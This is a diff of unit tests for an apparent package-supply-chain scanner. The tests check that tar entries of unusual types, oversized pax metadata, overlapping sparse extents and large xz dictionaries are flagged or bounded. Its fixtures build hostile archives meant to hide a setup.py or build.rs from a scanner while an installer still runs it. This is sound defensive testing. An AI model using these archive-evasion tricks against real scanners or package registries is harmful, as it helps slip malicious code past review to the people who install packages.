+        names = [m[0].rsplit("/", 1)[-1] for m in repo.iter_archive(data, "zip", "gomod")]
+        self.assertEqual(sorted(names), ["go.mod", "notes.txt"])
+
+
+def typed_member(name, data, typ):
+    """One raw ustar member of type `typ` that carries `data`, as a hostile
+    archive writes it: a device, a FIFO or an unknown type with a size."""
+    ti = tarfile.TarInfo(name)
+    ti.type, ti.mode, ti.size = typ, 0o644, len(data)
+    return ti.tobuf(tarfile.USTAR_FORMAT) + data + b"\0" * (-len(data) % 512)
+
+
+class EntryTypeTests(unittest.TestCase):
+    """The Go/Rust review's RM-1 (Oct 4, 2026): a tar entry that is not a
+    regular file, a directory or a link. pip writes one of a type no tool
+    writes (`9`, `A`) as a regular file, and cargo any entry but a directory
+    or a link as one (a device and a FIFO too); the scan read regular files
+    only, so a setup.py or a build.rs of such a type ran and was never read
+    (the release was OK). npm's node-tar skips them, as the scan does."""
+
+    PKG_INFO = b"Metadata-Version: 2.1\nName: x\nVersion: 1.0\n"
+
+    def sdist(self, typ):
+        return gzip.compress(tar_member("x-1.0/PKG-INFO", self.PKG_INFO)
+                             + typed_member("x-1.0/setup.py", DECODE_EXEC_PY.encode(), typ)
+                             + tar_member("x-1.0/README.md", b"x\n") + b"\0" * 1024)
+
+    def crate(self, typ):
+        return gzip.compress(tar_member("x-1.0.0/Cargo.toml", b'[package]\nname = "x"\nversion = "1.0.0"\n')
+                             + typed_member("x-1.0.0/build.rs", b"fn main() {}\n", typ)
+                             + typed_member("x-1.0.0/tools/run.js", EXFIL_JS.encode(), typ)
+                             + tar_member("x-1.0.0/README.md", b"x\n") + b"\0" * 1024)
+
+    def read(self, data, artifact):
+        anomalies = []
+        names = [m[0] for m in repo.iter_archive(data, "tgz", artifact, anomalies=anomalies)]
+        return names, anomalies
+
+    def test_pip_writes_an_entry_of_an_unknown_type_as_a_file(self):
+        for typ in (b"9", b"A", b"Z"):
+            with self.subTest(typ=typ):
+                names, anomalies = self.read(self.sdist(typ), "sdist")
+                self.assertEqual(names, ["PKG-INFO", "setup.py", "README.md"])
+                self.assertEqual([(k, p) for k, p, _ in anomalies], [("type", "setup.py")])
+                res = scan_bytes(self.sdist(typ), artifact="sdist", eco="pypi")
+                self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
+                self.assertIn("setup.py", {i["file"] for i in issues(res, "SC-EVAL-DECODE")})
+                self.assertEqual([(i["file"], i["sev"]) for i in issues(res, "SC-ARCHIVE-TYPE")], [("setup.py", "MAJOR")])
+
+    def test_cargo_writes_any_entry_but_a_folder_or_a_link_as_a_file(self):
+        for typ in (b"9", b"A", tarfile.CHRTYPE, tarfile.BLKTYPE, tarfile.FIFOTYPE):
+            with self.subTest(typ=typ):
+                names, anomalies = self.read(self.crate(typ), "crate")
+                self.assertEqual(names, ["Cargo.toml", "build.rs", "tools/run.js", "README.md"])   # (the data read by its size)
+                self.assertEqual([(k, p) for k, p, _ in anomalies], [("type", "build.rs"), ("type", "tools/run.js")])
+                res = repo._scan_artifact(self.crate(typ), "tgz", "crate", False, repo.Budget())
+                self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
+                self.assertIn("SC-ARCHIVE-TYPE", rules(res))
+
+    def test_a_device_in_an_sdist_is_not_a_file_pip_writes(self):
+        # pip fails on a device or a FIFO; the entry is not read, and its data is the ambiguity it was
+        names, _anomalies = self.read(self.sdist(tarfile.CHRTYPE), "sdist")
+        self.assertNotIn("setup.py", names)
+
+    def test_npm_skips_them_as_node_tar_does(self):
+        raw = (tar_member("package/package.json", manifest())
+               + typed_member("package/index.js", EXFIL_JS.encode(), b"9")
+               + tar_member("package/after.js", b"1\n") + b"\0" * 1024)
+        names, anomalies = self.read(gzip.compress(raw), "npm")
+        self.assertEqual(names, ["package.json", "after.js"])
+        self.assertEqual(anomalies, [])
+        self.assertEqual(scan_bytes(gzip.compress(raw))["verdict"], "OK")
+
+    def test_regular_files_are_unchanged(self):
+        for artifact, data in (("sdist", self.sdist(tarfile.REGTYPE)), ("crate", self.crate(tarfile.REGTYPE))):
+            with self.subTest(artifact=artifact):
+                names, anomalies = self.read(data, artifact)
+                self.assertEqual(anomalies, [])
+                self.assertIn("README.md", names)
+
+
+class TarResourceLimitTests(unittest.TestCase):
+    def test_a_pax_block_just_under_the_limit_is_read(self):
+        metadata = _pax_record("comment", "A" * (repo.MAX_TAR_METADATA_BLOCK - 64))
+        self.assertLessEqual(len(metadata), repo.MAX_TAR_METADATA_BLOCK)
+        members = list(repo.iter_archive(
+            pax_metadata_archive([("x-1.0/a.py", metadata)]), "tgz", "sdist"))
+        self.assertTrue(any(m[0] == "a.py" and m[3] is None for m in members), members)
+        self.assertFalse(any(m[3] is not None for m in members), members)
+
+    def test_large_pax_values_and_record_sets_are_refused_before_tarfile_parses_them(self):
+        cases = {
+            "large-value": _pax_record("comment", "A" * repo.MAX_TAR_METADATA_BLOCK),
+            "many-records": b"5 x=\n" * (repo.MAX_TAR_METADATA_BLOCK // 5 + 1),
+        }
+        for shape, metadata in cases.items():
+            self.assertGreater(len(metadata), repo.MAX_TAR_METADATA_BLOCK)
+            for artifact, name in (("sdist", "x-1.0/a.py"), ("npm", "package/a.js")):
+                with self.subTest(shape=shape, artifact=artifact):
+                    data = pax_metadata_archive([(name, metadata)])
+                    with mock.patch.object(tarfile.TarInfo, "_proc_pax",
+                                           side_effect=AssertionError("tarfile parsed oversized metadata")):
+                        members = list(repo.iter_archive(data, "tgz", artifact))
+                    self.assertFalse(any(m[3] is None for m in members), members)
+                    self.assertTrue(any(m[3] == "corrupt" and "tar metadata" in m.detail
+                                        for m in members), members)
+
+        result = scan_bytes(pax_metadata_archive([("x-1.0/a.py", cases["large-value"])]),
+                            artifact="sdist", eco="pypi")
+        self.assertEqual(result["verdict"], "INCOMPLETE", result["issues"])
+        self.assertIn("SC-TRUNCATED", rules(result))
+
+    def test_tar_metadata_has_a_cumulative_bound(self):
+        metadata = _pax_record("comment", "A" * 160)
+        data = pax_metadata_archive([(f"x-1.0/a{number}.py", metadata) for number in range(3)])
+        with mock.patch.object(repo, "MAX_TAR_METADATA_BLOCK", 256), \
+                mock.patch.object(repo, "MAX_TAR_METADATA_TOTAL", 400):
+            members = list(repo.iter_archive(data, "tgz", "sdist"))
+        complete = [m[0] for m in members if m[3] is None]
+        self.assertEqual(complete, ["a0.py", "a1.py"])
+        self.assertTrue(any(m[3] == "corrupt" and "tar metadata" in m.detail for m in members), members)
+
+    def test_pax_10_sparse_extent_count_is_bounded_before_the_map_is_built(self):
+        data = oversized_pax_10_sparse_sdist(repo.MAX_TAR_SPARSE_EXTENTS + 1)
+        members = list(repo.iter_archive(data, "tgz", "sdist"))
+        self.assertFalse(any(m[3] is None for m in members), members)
+        self.assertTrue(any(
+            m[3] == "corrupt" and "sparse map declares 4,097 extents" in m.detail
+            for m in members
+        ), members)
+
+    def test_pax_10_sparse_extent_limit_accepts_4096(self):
+        data = long_pax_10_sparse_sdist(repo.MAX_TAR_SPARSE_EXTENTS, digits=1)
+        members = list(repo.iter_archive(data, "tgz", "sdist"))
+        self.assertTrue(any(m[0] == "setup.py" and m[3] is None for m in members), members)
+
+    def test_pax_10_sparse_numbers_are_bounded_on_the_first_and_later_lines(self):
+        accepted = (
+            pax_10_sparse_lines("0" * 31 + "1", "0", "0"),
+            pax_10_sparse_lines("1", "0" * 32, "0"),
+        )
+        for data in accepted:
+            with self.subTest(case="32 bytes"):
+                members = list(repo.iter_archive(data, "tgz", "sdist"))
+                self.assertTrue(any(m[0] == "setup.py" and m[3] is None for m in members), members)
+
+        refused = (
+            pax_10_sparse_lines("0" * 32 + "1", "0", "0"),
+            pax_10_sparse_lines("1", "0" * 33, "0"),
+        )
+        for data in refused:
+            with self.subTest(case="33 bytes"):
+                members = list(repo.iter_archive(data, "tgz", "sdist"))
+                self.assertTrue(any(m[3] == "corrupt" and "numeric field longer" in m.detail
+                                    for m in members), members)
+
+    def test_maximum_pax_10_sparse_map_is_parsed_in_linear_time(self):
+        data = long_pax_10_sparse_sdist(repo.MAX_TAR_SPARSE_EXTENTS, digits=480)
+        started = time.perf_counter()
+        members = list(repo.iter_archive(data, "tgz", "sdist"))
+        elapsed = time.perf_counter() - started
+        self.assertTrue(any(m[3] == "corrupt" and "numeric field longer" in m.detail
+                            for m in members), members)
+        self.assertLess(elapsed, 1.0, f"bounded sparse map took {elapsed:.3f}s")
+
+    def test_old_gnu_sparse_extension_blocks_share_the_metadata_byte_bound(self):
+        data = old_gnu_sparse_sdist(2)
+        with mock.patch.object(repo, "MAX_TAR_METADATA_TOTAL", tarfile.BLOCKSIZE):
+            members = list(repo.iter_archive(data, "tgz", "sdist"))
+        self.assertFalse(any(m[3] is None for m in members), members)
+        self.assertTrue(any(
+            m[3] == "corrupt" and "1,024 bytes so far" in m.detail
+            for m in members
+        ), members)
+
+
+class SparseAndAliasBudgetTests(unittest.TestCase):
+    def test_tar_xz_and_auto_lzma_bound_decoder_memory(self):
+        ordinary = tar_xz_with_dictionary_property(28)  # 64 MiB dictionary: xz -9's tier
+        hostile = tar_xz_with_dictionary_property(36)   # 1 GiB dictionary
+        for container in ("txz", "tlz"):
+            with self.subTest(container=container, dictionary="64 MiB"):
+                members = list(repo.iter_archive(ordinary, container, "sdist"))
+                self.assertTrue(any(m[0] == "a.py" and m[3] is None for m in members), members)
+            with self.subTest(container=container, dictionary="1 GiB"):
+                members = list(repo.iter_archive(hostile, container, "sdist"))
+                self.assertFalse(any(m[3] is None for m in members), members)
+                self.assertTrue(any(m[3] == "corrupt" and "decompression failed" in m.detail
+                                    for m in members), members)
+
+        with mock.patch.object(repo.lzma, "LZMADecompressor", wraps=lzma.LZMADecompressor) as make:
+            list(repo.iter_archive(ordinary, "txz", "sdist"))
+        self.assertTrue(make.call_args_list)
+        self.assertTrue(all(call.kwargs.get("memlimit") == repo.MAX_LZMA_MEMORY
+                            for call in make.call_args_list), make.call_args_list)
+
+    def test_overlapping_sparse_extents_are_incomplete_in_every_encoding(self):
+        installed = DECODE_EXEC_PY.encode()
+        scanned = b"#" + b"x" * (len(installed) - 2) + b"\n"
+        for sparse_format in ("pax-0.0", "pax-0.1", "pax-1.0", "old-gnu"):
+            with self.subTest(sparse_format=sparse_format):
+                data = overlapping_sparse_sdist(sparse_format, scanned, installed)
+                members = list(repo.iter_archive(data, "tgz", "sdist"))
+                self.assertFalse(any(m[0] == "setup.py" and m[3] is None for m in members), members)
+                self.assertTrue(any(m[0] == "setup.py" and m[3] == "corrupt"
+                                    and "sparse map" in m.detail for m in members), members)
+                res = scan_bytes(data, artifact="sdist", eco="pypi")
+                self.assertEqual(res["verdict"], "INCOMPLETE", res["issues"])
+                self.assertIn("SC-TRUNCATED", rules(res))
+
+    def test_a_nonzero_zero_length_sparse_marker_is_incomplete_in_every_encoding(self):
+        installed = DECODE_EXEC_PY.encode()
+        prefix = b"#" + b"x" * 254 + b"\n"
+        for sparse_format in ("pax-0.0", "pax-0.1", "pax-1.0", "old-gnu"):
+            with self.subTest(sparse_format=sparse_format):
+                data = zero_length_sparse_sdist(sparse_format, prefix, installed)
+                members = list(repo.iter_archive(data, "tgz", "sdist"))
+                self.assertFalse(any(m[0] == "setup.py" and m[3] is None for m in members), members)
+                self.assertTrue(any(m[0] == "setup.py" and m[3] == "corrupt"
+                                    and "zero-length extent" in m.detail for m in members), members)
+                res = scan_bytes(data, artifact="sdist", eco="pypi")
+                self.assertEqual(res["verdict"], "INCOMPLETE", res["issues"])
+                self.assertIn("SC-TRUNCATED", rules(res))
+
+    def test_valid_sparse_holes_count_toward_the_total_budget(self):
+        raw = sparse_member("x-1.0/setup.py", 10_000_008, b"PAYLOAD\n")
+        budget = repo.Budget(total=4096)
+        members = list(repo.iter_archive(gzip.compress(raw), "tgz", "sdist", budget=budget))
+        self.assertFalse(any(m[0] == "setup.py" and m[3] is None for m in members), members)
+        self.assertEqual(members[-1][3], "total")
+
+    def test_an_oversized_sparse_pth_observes_cancellation_between_chunks(self):
+        raw = sparse_member("x-1.0/route.pth", 64 << 20, b"x")
+        observed = 0
+
+        def pth(_state, chunk, _final):
+            nonlocal observed
+            observed += len(chunk)
+            return {"state": None, "lines": [], "cuts": []}
+
+        budget = repo.Budget(total=128 << 20, cancel=lambda: observed >= 2 << 20)
+        with mock.patch.object(repo, "MAX_MEMBER", 1 << 20), \
+                mock.patch.object(repo.lazaret, "pth_stream", side_effect=pth), \
+                self.assertRaises(repo.ScanCancelled):
+            list(repo.iter_archive(gzip.compress(raw), "tgz", "sdist", budget=budget))
+        self.assertGreaterEqual(observed, 2 << 20)
+        self.assertLess(observed, 4 << 20)
+
+    def test_initial_tar_member_read_observes_cancellation_between_chunks(self):
+        reads = 0
+
+        class Stream:
+            def read(self, amount):
+                nonlocal reads
+                reads += 1
+                return b"x" * amount
+
+        budget = repo.Budget(total=128 << 20, cancel=lambda: reads >= 2)
+        with self.assertRaises(repo.ScanCancelled):
+            repo._tar_member_prefix(Stream(), 8 << 20, budget)
+        self.assertEqual(reads, 2)
+
+    def test_link_alias_scan_work_counts_toward_the_total_budget(self):
+        content = b"#" + b"x" * ((128 << 10) - 2) + b"\n"
+        raw = tar_member("x-1.0/docs/base.py", content)
+        for number in range(50):
+            raw += tar_member(f"x-1.0/links/l{number}.py", b"", tarfile.SYMTYPE, "../docs/base.py")
+        data = gzip.compress(raw + b"\0" * 1024)
+        members = list(repo.iter_archive(data, "tgz", "sdist", budget=repo.Budget(total=1 << 20)))
+        aliases = [m for m in members if m[0].startswith("links/") and m[3] is None]
+        self.assertGreater(len(aliases), 0)
+        self.assertLess(len(aliases), 50)
+        self.assertEqual(members[-1][3], "total")
+
+    def test_equal_source_aliases_share_retained_text_and_engine_work(self):
+        first = "x = 1\n" * 1000
+        second = first.encode().decode()
+        self.assertIsNot(first, second)
+        state = repo._ArtifactScan("sdist", False)
+        try:
+            state.scan_source("a.py", first, "py")
+            state.scan_source("b.py", second, "py")
+            self.assertIs(state.sources["a.py"][0], state.sources["b.py"][0])
+            items = [("a.py", first, "py", True), ("b.py", second, "py", True)]
+            with mock.patch.object(repo._engine, "call_answers", return_value=[[]]) as called:
+                self.assertEqual(state._scan_files(items), [[], []])
+            asked = called.call_args.args[0]
+            self.assertEqual(len(asked), 1)
+        finally:
+            state.release()
 
 
 class BudgetTests(unittest.TestCase):
